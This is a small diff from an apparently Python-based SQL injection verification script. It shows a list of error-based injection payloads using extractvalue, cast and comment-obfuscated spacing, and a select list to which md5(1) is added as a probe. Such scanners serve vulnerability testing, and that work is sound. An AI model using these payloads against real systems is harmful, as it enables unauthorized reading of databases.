@@ -13,7 +13,7 @@ urllib3.disable_warnings()
 
 payload_list = ["'and/**/extractvalue(1,concat(char(126),{}))and'","\"and/**/extractvalue(1,concat(char(126),{}))and\"","extractvalue(1,concat(char(126),{}))","1/**/and/**/extractvalue(1,concat(char(126),{}))","'and(select'1'from/**/cast({}as/**/int))>'0","1/**/and/**/cast({}as/**/int)>0"]
 
-select_list = ["database()", "version()"]
+select_list = ["database()", "version()", "md5(1)"]
 
 
 def verify(vulnurl):
